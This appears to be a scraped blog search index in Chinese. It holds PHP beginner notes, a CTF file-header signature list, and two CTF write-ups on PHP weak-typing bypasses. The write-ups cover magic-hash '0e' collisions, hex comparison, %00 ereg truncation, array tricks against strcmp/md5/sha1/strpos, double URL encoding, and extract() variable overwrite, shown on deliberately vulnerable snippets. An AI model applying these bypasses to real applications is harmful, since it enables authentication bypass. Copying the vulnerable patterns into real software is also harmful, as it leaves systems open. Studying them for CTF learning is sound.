用于中断一些循环。后面可以接上一些数字表示跳出几层循环，不加默认为跳出当前循环。 ②continue语句只能在循环语句中起作用，表示结束本次循环，本不是结束整个循环语句。 ③exit（）函数结束当前整个程序的执行，并退出。die()函数和其一样。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--运算符（三）","slug":"php学习--运算符（三）","date":"2020-05-06T07:04:05.000Z","updated":"2020-05-11T09:08:47.043Z","comments":true,"path":"2020/05/06/php学习--运算符（三）/","link":"","permalink":"https://qidian-png.github.io/2020/05/06/php%E5%AD%A6%E4%B9%A0--%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"前言：php的运算符与C语言比较，相似的地方有很多，相差的地方也很大啊！ 目录： 0×01：算数运算符 ① + 就是1+1=2； 1234$a&#x3D;1;$b&#x3D;2;$c&#x3D;$a+$b;echo $c; ② ➖ 1.单纯的减号 1234$a&#x3D;10;$b&#x3D;2;$c&#x3D;$a-$b;echo $c; 2.取反 12345$a&#x3D;1;$b&#x3D;-$a;echo $b; &#x2F;&#x2F;-1echo &lt;br &#x2F;&gt;;echo $a; &#x2F;&#x2F;1 ③ * 乘号 1234$a&#x3D;3;$b&#x3D;4;$c&#x3D;$a*$b;echo $c; 就是简单的乘号。 ④ / 除号 1234$a&#x3D;10;$b&#x3D;2;$c&#x3D;$a&#x2F;$b;echo $c; ⑤ – ，++运算 12++$a; --$a ; 就是先自增或者自减，让后$a参与运算。 12$a--;$a++; 就是先让$a参与运算，让后进行自增或者自减。 注意： 123$a&#x3D;10; ++$a; echo $a; 这种情况 ++$a与$a++都没有参与数值运算，情况相同，数值相同。 0×02：字符串运算符 PHP中的字符串运算符只有一个.,也成为连接运算符。 0×03：赋值运算符 1&#x3D;，+&#x3D;，*&#x3D;，-&#x3D;，&#x2F;&#x3D;，%&#x3D;，.&#x3D; 等等 二元运算符：左边的操作数必须是变量，右边的可以是一个表达式，一个值，一个变量等等。 ①=：即赋值（不同于数学里的等于），即将等号右边的值赋给左边的变量。② 123456+&#x3D;：$a+&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a+$b;-&#x3D;:$a-&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a-$b;*&#x3D;:$a*&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$A*$b;&#x2F;&#x3D;:$a&#x2F;&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$S&#x2F;$b;%&#x3D;:$a%&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a%$b; 取余.&#x3D;:$a&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a.$b 0×04：比较运算符 1&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;，!&#x3D;, &lt;&gt; , !&#x3D;&#x3D; , &lt; , &gt; , &lt;&#x3D; , &gt;&#x3D;等等 概念：对操作数进行比较，满足条件即为true，否则为false。 PHP规定： 使用echo输出布尔类型值的时候； echo true ; 显示结果为1 echo false; 显示为空白如果我们要输出布尔类型值的时候，我们最好使用var_dump()输出的结果更明了！ ①== （值相等） 12$a&#x3D;&#x3D;$b;var_dump（$a&#x3D;&#x3D;$b） 值相等为true，不相等为false。 ②=== (值相等，类型也要相等) 12345$a&#x3D;11;$b&#x3D;&#39;11&#39;;var_dump($a&#x3D;&#x3D;$b); &#x2F;&#x2F;trueecho &lt;br &#x2F;&gt;;var_dump($a&#x3D;&#x3D;&#x3D;$b); &#x2F;&#x2F;false ③!= ,&lt;&gt;(值不相等) 123$a&#x3D;1;$b&#x3D;2;var_dump($a!&#x3D;$b); &#x2F;&#x2F;true ④ !== (不全等)值或类型有一个相等的就可以。 ⑤&lt; , &gt; , &lt; = , &gt;= ;这个就是和数学里的一样，没必要细说。 0×05：逻辑运算符概念;对表达式进行逻辑运算，运算出来的结果是布尔类型的值（trure,false）,要求参与运算的值是布尔类型的，否则会被强制转换让后参与运算。以下值被认为false，其他的值都是被认为true。布尔值false0浮点型0.0空白字符串和字符串0没有成员的数组NULL ①and &amp;&amp; (逻辑与)只有两边同时为true时，最后的结果才为true。 ②or || (逻辑或)两边有一个为true时，最后的输出结果为true。也即是两边同时为false时，才能为false。 ③xor (逻辑异或)左右两边的值不一样是结果为true，一样时为false。 ④ ！ 逻辑非将原表达式的值否定掉，true变成false，false变成true。 0×06：位运算符 位运算符用于对操作数中的每一个二进制位进行运算。 0×07;其他运算符 ①？ ：三元运算符表达式1 ？ 表达式2 ：表达式3；如果表达式1的值为true，则执行表达式2，否则执行表达式3。 ②’ ‘可以把系统的命令放在里面执行！（Windows系统） ③@屏蔽表达式可能发生的错误！注意：是表达式 echo @$b; ④=&gt; , -&gt; ,instanceof(先省略) 0×08：运算符的优先级①【无】递增递减②【右-&gt;左】逻辑非③【左-&gt;右】乘，除，取余④【左】加，减，字符串连接⑤【无】包含大于号，小于号的运算符⑥【无】不包含大于号或者小于号的运算符⑦【左】逻辑与 &amp;&amp;⑧【左】逻辑或 ||⑨【左】？ ：⑩【右】赋值运算符⒒【左】逻辑异或 xor 圆括号里的可以看成一个整体，并且圆括号可以增加程序的可读性。 短路问题： 1234$a&#x3D;false;$b&#x3D;1;$a &amp;&amp; ++$b;echo $b; &#x2F;&#x2F;上面的$b直接被短路掉！并且数值不变！ 语言设计者认为：只要有逻辑运算符（逻辑与，逻辑或），那么运算结果就是一个true或者false。整个程序的运行过程就不重要了。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--常量（二）","slug":"php学习--常量（二）","date":"2020-05-05T07:04:05.000Z","updated":"2020-05-11T09:04:29.242Z","comments":true,"path":"2020/05/05/php学习--常量（二）/","link":"","permalink":"https://qidian-png.github.io/2020/05/05/php%E5%AD%A6%E4%B9%A0--%E5%B8%B8%E9%87%8F%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"# 常量 1、概念： 常量是用于临时（只有在我们的程序运行过程中才存在）存储值（数据）的容器。 2、定义和使用： define（’常量名称’，常量值） 或者 define（”常量名称”，常量值）（和C语言的宏常量命名相似） 常量的命名： 1）和变量一样，只能包含字母数字下划线，必须以字母或者下划线开头。 2） 按照惯例常量名字总是大写，根据个人习惯不做强求。 3）自己定义的常量是严格区分大小写的。 defined（）函数来检查是否定义了某个常量。 3、常量和变量的区别。 1）常量的前面没有美元符号（$） 2) 常量只能用define（）函数定义，不能通过赋值语句。 3）常量可以不用理会变量范围的规则而在任何地方定义和使用。（和C语言一样） 4）常量一旦被定义就不能被重新定义或者取消定义。 5）常量的值只能说bool,int,float,string类型。 4、预定义常量： 就是我们php内核已经帮我们定义好了的常量。 怎么感觉就是c,c++里面的库，用的时候前面调用一下就行了。 1）预定义常量是以__开头的，又被称为魔术常量。 2）预定义常量不区分大小写。 代码所在位置不同它的值也是不同的。 八个常用魔术变量： 12345678(1). __FILE__ 当前文件路径(2). __DIR__ 当前文件目录(3). __LINE__ 在文件文件的那一行 (4). __FUNCTION__ 在当前文件的那个函数中 返回 函数名(5). __CLASS__ 在当前文件中的那个类中 返回 类名(6). __METHOD__ 在当前文件的类中的那个方法中 返回 类名::方法名(7). __Trait__ 名包括其被声明的作用区域，从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖(8).__NAMESPACE__ 当前命名空间的名称（区分大小写）。此常量是在编译时定义的.","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP弱类型及绕过方式（二）","slug":"PHP弱类型及绕过方式（二）","date":"2020-05-04T07:04:05.000Z","updated":"2020-05-11T09:00:14.378Z","comments":true,"path":"2020/05/04/PHP弱类型及绕过方式（二）/","link":"","permalink":"https://qidian-png.github.io/2020/05/04/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"继续！！！ 目录： 0×01.md5加密相等绕过 0×02.十六进制与数字比较 0×03.ereg正则%00截断 0×04.strpos数组绕过 0×01.md5加密相等绕过 123456789101112&lt;?php$md51 &#x3D; md5(&#39;QNKCDZO&#39;);$a &#x3D; @$_GET[&#39;a&#39;];$md52 &#x3D; @md5($a);if(isset($a))&#123;if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;echo &quot;flag&#123;*&#125;&quot;;&#125; else &#123;echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125;?&gt; 看看上面的代码，有点矛盾，让他们MD5加密之后相等，但是明文却不同，what？百度一下，发现QNKCDZO经过MD5 加密之后为： 0e830400451993494058024219903391 原理： PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 那么我们就可以用其他0exxxxx来进行比较就能拿到flag。以下这些字符串，md5哈希之后都是0e开头的： s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 s1502113478a0e861580163291561247404381396064 s1885207154a0e509367213418206700842008763514 s1836677006a0e481036490867661113260034900752 s155964671a0e342768416822451524974117254469 s1184209335a0e072485820392773389523109082030 s1665632922a0e731198061491163073197128363787 s1502113478a0e861580163291561247404381396064 s1836677006a0e481036490867661113260034900752 s1091221200a0e940624217856561557816327384675 s155964671a0e342768416822451524974117254469 0×02.十六进制与数字比较 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag &#x3D; &#39;flag&#123;test&#125;&#39;;$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值$number &#x3D; &#39;3735929054&#39;;&#x2F;&#x2F; Check all the input characters!for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123;&#x2F;&#x2F; Disallow all the digits!$digit &#x3D; ord($temp&#123;$i&#125;);if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number &#x3D;&#x3D; $temp)return $flag;&#125;$temp &#x3D; $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt; 首先看看代码，函数要求变量temp不能存在1~9之间的数字，最后，又要求temp=3735929054;有点自相矛盾，但php在转码时会把16进制转化为十进制.于是把3735929054转换成16进制为0xdeadc0de，记得带上0x；把3735929054进行十六进制转化deadc0de，然后PHP再转回来，emmmm就欧克了0×03.ereg正则%00截断 1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag &#x3D; &quot;xxx&quot;;if (isset ($_GET[&#39;password&#39;]))&#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)&#123;echo &#39;You password must be alphanumeric&#39;;&#125;else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)&#123;if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置&#123;die(&#39;Flag: &#39; . $flag);&#125;else&#123;echo(&#39;- have not been found&#39;);&#125;&#125;else&#123;echo &#39;Invalid password&#39;;&#125;&#125;?&gt; 看来一下代码 &lt;8,&gt;9999999,存在矛盾 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。 用正则匹配，如果有’a-zA-Z0-9’则直接错误，我们可以用%00来截断，在%00之后的数值函数无法识别,同时满足 strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999 长度跟数值本来就矛盾，我们可以用1e8 即1x10的八次方或者用数组绕过。 strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到”-“才能输出flag。0×04.strpos数组绕过 1234567891011&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;ctf&#39;])) &#123;if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;&#125;?&gt; 看看代码首先看到的是get传参 ctf，然后必须是数字，然后再绕过 strpos。strpos函数可以用数组绕过。emmmmm，flag到手。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP弱类型及绕过方式（一）","slug":"PHP弱类型及绕过方式（一）","date":"2020-05-03T07:04:05.000Z","updated":"2020-05-27T06:06:35.377Z","comments":true,"path":"2020/05/03/PHP弱类型及绕过方式（一）/","link":"","permalink":"https://qidian-png.github.io/2020/05/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"前言：学长带着我们学习了一些PHP弱类型，现在总结记一下。 目录： 0×01.extract函数变量覆盖 0×02.strcmp函数数组漏洞 0×03.urldecode二次密码绕过 0×04.md5函数加密 0×05.sha()函数比较绕过 0×06.数组返回NULL绕过 0×07.弱类型整数大小比较绕过 以下题目来源BugkuCTF 0×01.extract函数变量覆盖 12345678910111213141516&lt;?php$flag&#x3D;&#39;xxx&#39;;extract($_GET);if(isset($shiyan))&#123;$content&#x3D;trim(file_get_contents($flag));if($shiyan&#x3D;&#x3D;$content)&#123;echo&#39;flag&#123;xxx&#125;&#39;;&#125;else&#123;echo&#39;Oh.no&#39;;&#125;&#125;?&gt; 里面有很多函数是我没见过的，先了解一下。 extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。漏洞： isset() 函数用于检测变量是否已设置并且非 NULL。如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 trim() 函数移除字符串两侧的空白字符或其他预定义字符。 file_get_contents() 函数把整个文件读入一个字符串中。漏洞：当()里是变量的话，会返回为空值。 运算符的了解：首先，我们传入的函数经过extract函数处理，if语句判断是否存在shiyan变量，file_get_contents() 处理的是flag会返回空值，即content=空值。要想拿到flag，我们就需要让shiyan也为空值，但这并不能看到变量的覆盖。我们传入的shiyan= ,即将原来的shiyan的覆盖为空值，同时我们传入flag= ，覆盖原来flag的值为空，就可以拿到flag了，这题有点小毛病。0×02.strcmp函数数组漏洞 12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123;if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。&#x2F;&#x2F;比较两个字符串（区分大小写）die(&#39;Flag: &#39;.$flag);elseprint &#39;No&#39;;&#125;?&gt; 看到不懂的函数就去问度娘 die() 函数输出一条消息，并退出当前脚本。 int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 我们要想拿到flag，就需要str1=str2,但是flag的长度我们也不知道，这个时候我们就不能走寻常路了： 在这里strcmp函数有漏洞只需将get传入进来的变为数组就行了。注：这一个漏洞适用与5.3之前版本的php。flag到手。 0×03.urldecode二次密码绕过 代码奉上： 12345678910111213141516171819202122 &lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;echo(&quot;not allowed!&quot;);exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123;echo &quot;Access granted!&quot;;echo &quot;flag&quot;;&#125;?&gt; eregi()函数在由模式指定的字符串中搜索指定的字符串，搜索不区分大小写。exit() 函数输出一条消息，并退出当前脚本。 我们传入的id会被eregi函数与hackerDJ比较，相同的话直接就GG了。所以我往下面看，我们传入的id经过一次url解码等于hackerDJ的话就可以拿到flag，但是浏览器还会给我们解码一次，这就意味着我们需要给hackerDJ编码两次，就能拿到flag。 0×04.md5函数加密 123456789101112&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])print &#39;Your password can not be your username.&#39;;else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))die(&#39;Flag: &#39;.$flag);elseprint &#39;Invalid password&#39;;&#125;?&gt; 我们要知道md5函数加密在低版本中是无法处理数组的(但是md5处理数组时会返回空值)。那么突破口就来了，但是：两个返回的都是null，自然是相同的，但是代码中又要求我们不相同。emmmmmmm,思考一下。 这样值就不一样了，flag到手！ 0×05.sha()函数比较绕过 123456789101112131415161718192021222324252627282930&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123;var_dump($_GET[&#39;name&#39;]);echo &quot;&quot;;var_dump($_GET[&#39;password&#39;]);var_dump(sha1($_GET[&#39;name&#39;]));var_dump(sha1($_GET[&#39;password&#39;]));if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])echo &#39;Your password can not be your name!&#39;;else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))die(&#39;Flag: &#39;.$flag);elseecho &#39;Invalid password.&#39;;&#125;elseecho &#39;Login first!&#39;;?&gt; 这sha1函数加密，绕过方式和MD5一样，这里就不详讲了。sha1()函数无法处理数组类型，将报错并返回false。flag奉上！ 0×06.数组返回NULL绕过 123456789101112&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;password&#39;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;You password must be alphanumeric&#39;;else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39; . $flag);elseecho &#39;Invalid password&#39;;&#125;?&gt; 1if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE) ereg函数会对你传入的password从a-z,A-Z,0-9 进行匹配，将你的密码限制在这三种字符中。 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。这里ereg有两个漏洞： ①%00截断及遇到%00则默认为字符串的结束 ②当ntf为数组时它的返回值不是FALSE​这个漏洞没有使用到。 strpos — 查找字符串首次出现的位置作用：主要是用来查找字符在字符串中首次出现的位置。 strpos()如果传入数组，会返回NULL（和MD5，sha1类似无法处理数组，返回值为NULL）思路就出来了： 嘿嘿嘿，flag到手。 0×07.弱类型整数大小比较绕过 1234$temp &#x3D; $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123;echo $flag; 简单明了 is_numeric() 函数用于检测变量是否为数字或数字字符串。我们传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，所以我们要后者使其返回为NULL，并且大于1366. 这就结束了？ 对的 未完待续……","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"CTF杂项题，文件头文件尾格式总结！","slug":"CTF杂项题，文件头文件尾格式总结！","date":"2020-04-10T07:04:05.000Z","updated":"2020-05-11T08:48:37.714Z","comments":true,"path":"2020/04/10/CTF杂项题，文件头文件尾格式总结！/","link":"","permalink":"https://qidian-png.github.io/2020/04/10/CTF%E6%9D%82%E9%A1%B9%E9%A2%98%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%BE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93%EF%BC%81/","excerpt":"","text":"zip文件学习 1.文件头文件尾总结JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3B ZIP Archive (zip)， 文件头：504B0304 文件尾：50 4B TIFF (tif)， 文件头：49492A00 文件尾：Windows Bitmap (bmp)， 文件头：424D 文件尾：CAD (dwg)， 文件头：41433130 文件尾：Adobe Photoshop (psd)， 文件头：38425053 文件尾：Rich Text Format (rtf)， 文件头：7B5C727466 文件尾：XML (xml)， 文件头：3C3F786D6C 文件尾：HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596 RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D5468642.从winhex中取出的文件头列表 File Type ExtensionsHeader JPEG jpg;jpeg 0xFFD8FF PNG png 0x89504E470D0A1A0A GIF gif GIF8 TIFF tif;tiff 0x49492A00 TIFF tif;tiff 0x4D4D002A Bit map bmp BM AOL ART art 0x4A47040E000000 AOL ART art 0x4A47030E000000 PC Paintbrush pcx 0x0A050108 Graphics Metafile wmf 0xD7CDC69A Graphics Metafile wmf 0x01000900 Graphics Metafile wmf 0x02000900 Enhanced Metafile emf 0x0100000058000000 Corel Draw cdr CDR CAD dwg 0x41433130 Adobe Photoshop psd 8BPS Rich Text Format rtf rtf XML xml HTML html;htm;PHP;php3;php4;phtml;shtml type Email eml Delivery-date: Outlook Express dbx 0xCFAD12FE Outlookpst!BDN MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1 MS Access mdb;mda;mde;mdt Standard J WordPerfect wpd 0xFF575043 OpenOffice Writer sxw writer OpenOffice Calc sxc calc OpenOffice Math sxm math OpenOffice Impress sxi impress OpenOffice Draw sxd draw Adobe FrameMaker fm &lt;MAKERFILE PostScript eps.or.ps;ps;eps %!PS-Adobe Adobe Acrobat pdf %PDF-1. Quicken qdf 0xAC9EBD8F QuickBooks Backup qbb 0x458600000600 Sage sly.or.srt.or.slt;sly;srt;slt0x53520100 Sage Backup 1 SAGEBACKUP Lotus WordPro v9 lwp 0x576F726450726F Lotus 123 v9 123 0x00001A00051004 Lotus 123 v5 wk4 0x00001A0002100400 Lotus 123 v3 wk3 0x00001A0000100400 Lotus 123 v1 wk1 0x2000604060 Windows Password pwl 0xE3828596 ZIP Archive zip;jar 0x504B0304 ZIP Archive (outdated) zip 0x504B3030 RAR Archive rar Rar! GZ Archive gz;tgz 0x1F8B083.各种文件类型文件头标志位详细列表 FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File” FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File” 474946383961, .gif, “GIF 89A” 474946383761, .gif, “GIF 87A” 424D, .bmp, “Windows Bitmap” 4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd; .cpl;.x32, “Executable File” 504B0304, .zip, “Zip Compressed” 3A42617365, .cnt, “” D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile” 0100000058000000, .emf, “” 03000000C466C456, .evt, “” 3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile” 1F8B08, .gz, “GZ Compressed File” 28546869732066696C65, .hqx, “” 0000010000, .ico, “Icon File” 4C000000011402, .lnk, “Windows LinkFile” 25504446, .pdf, “Adobe PDF File” 5245474544495434, .reg, “” 7B5C727466,.rtf, “Rich Text Format File” lh, .lzh, “Lz compression file” MThd, .mid, “” 0A050108, .pcx, “” 25215053, .eps, “Adobe EPS File” 2112, .ain, “AIN Archive File” 1A02, .arc, “ARC/PKPAK Compressed 1” 1A03, .arc, “ARC/PKPAK Compressed 2” 1A04, .arc, “ARC/PKPAK Compressed 3” 1A08, .arc, “ARC/PKPAK Compressed 4” 1A09, .arc, “ARC/PKPAK Compressed 5” 60EA, .arj, “ARJ Compressed” 41564920, .avi, “Audio Video Interleave(AVI)” 425A68, .bz;.bz2, “Bzip Archive” 49536328, .cab, “Cabinet File” 4C01, .obj, “Compiled Object Module” 303730373037, .tar;.cpio, “CPIO ArchiveFile” 4352555348, .cru;.crush, “CRUSH ArchiveFile” 3ADE68B1, .dcx, “DCX Graphic File” 1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile” 91334846, .hap, “HAP Archive File” 3C68746D6C3E,.htm;.html, “HyperText Markup Language 1” 3C48544D4C3E,.htm;.html, “HyperText Markup Language 2” 3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3” 100, .ico, “ICON File” 5F27A889, .jar, “JAR Archive File” 2D6C68352D,.lha, “LHA Compressed” 20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet” 00001A0007800100, .fm3, “Lotus 123 v3 FMTfile” 00001A0000100400, .wk3, “Lotus 123 v3Worksheet” 20006800200, .fmt, “Lotus 123 v4 FMTfile” 00001A0002100400, .wk4, “Lotus 123 v5” 5B7665725D, .ami, “Lotus Ami Pro” 300000041505052, .adx, “Lotus ApproachADX file” 1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template” 4D47582069747064, .ds4, “MicrografixDesigner 4” 4D534346, .cab, “Microsoft CAB FileFormat” 4D546864, .mid, “Midi Audio File” 000001B3, .mpg;.mpeg, “MPEG Movie” 0902060000001000B9045C00, .xls, “MS Excel v2” 0904060000001000F6055C00, .xls, “MS Excel v4” 7FFE340A,.doc, “MS Word” 1234567890FF, .doc, “MS Word 6.0” 31BE000000AB0000, .doc, “MS Word forDOS 6.0” 1A00000300001100, .nsf, “NotesDatabase” 7E424B00, .psp, “PaintShop Pro Image File” 504B0304, .zip, “PKZIP Compressed” 89504E470D0A, .png, “PNG Image File” 6D646174, .mov, “QuickTime Movie” 6D646174, .qt, “Quicktime MovieFile” 52617221, .rar, “RAR Archive File” 2E7261FD, .ra;.ram, “Real AudioFile” EDABEEDB, .rpm, “RPM Archive File” 2E736E64, .au, “SoundMachine AudioFile” 53495421, .sit, “Stuffit v1 ArchiveFile” 53747566664974, .sit, “Stuffit v5Archive File” 1F9D, .z, “TAR Compressed ArchiveFile” 49492A, .tif;.tiff, “TIFF (Intel)” 4D4D2A,.tif;.tiff, “TIFF (Motorola)” 554641, .ufa, “UFA Archive File” 57415645666D74, .wav, “Wave Files” D7CDC69A,.wmf, “Windows Meta File” 4C000000, .lnk, “Windows Shortcut (LinkFile)” 504B3030504B0304, .zip, “WINZIPCompressed” FF575047, .wpg, “WordPerfectGraphics” FF575043, .wp, “WordPerfect v5 orv6” 3C3F786D6C,.xml, “XML Document” FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)” 3C21454E54495459, .dtd, “XML DTD” 5A4F4F20, .zoo, “ZOO Archive 